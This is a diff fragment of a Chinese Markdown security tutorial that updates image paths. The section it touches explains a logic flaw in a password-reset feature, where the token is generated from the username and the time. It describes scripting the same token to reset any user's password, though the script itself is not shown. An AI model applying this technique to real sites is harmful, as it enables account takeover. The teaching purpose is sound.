+![image-20250223234437939](static/image/image-20250223234437939.png)
 
 ### 逻辑型漏洞
 
@@ -1084,13 +1084,13 @@ preg_replace()
 以下页面的正常业务功能是找回密码。
 ```
 
-![image-20250224010845010](image/image-20250224010845010.png)
+![image-20250224010845010](static/image/image-20250224010845010.png)
 
 ```
 我们可以看到它的核心代码是根据+用户名生成一个 token 来进行验证修改密码。导致该代码存在一个很严重的逻辑型漏洞，比如我们可以编写一个脚本也同样根据时间和用户名生成 token，来实现任意用户密码修改的目的。
 ```
 
-![image-20250224010933396](image/image-20250224010933396.png)
+![image-20250224010933396](static/image/image-20250224010933396.png)
 
 ```python
 # 以下是我用python编写的一个生成token的脚本
@@ -1117,24 +1117,24 @@ if __name__ == '__main__':
 然后我们先运行脚本，再去输入用户名发送请求找回密码。
 ```
 
-![image-20250224011412332](image/image-20250224011412332.png)
+![image-20250224011412332](static/image/image-20250224011412332.png)
 
-![image-20250224011436672](image/image-20250224011436672.png)
+![image-20250224011436672](static/image/image-20250224011436672.png)
 
 ```
 发送请求后我们可以发现它在数据库里添加了一条带有 token 值的数据来做验证使用。
 ```
 
-![image-20250224011627990](image/image-20250224011627990.png)
+![image-20250224011627990](static/image/image-20250224011627990.png)
 
 ```
 我们再通过运行的脚本来比对一下。
 ```
 
-![image-20250224011659199](image/image-20250224011659199.png)
+![image-20250224011659199](static/image/image-20250224011659199.png)
 
 ```
 可以发现我们脚本生成的 token 有和它数据库里的 token 一样的。成功完成修改密码的操作。
 ```
 
-![image-20250224011820937](image/image-20250224011820937.png)
+![image-20250224011820937](static/image/image-20250224011820937.png)
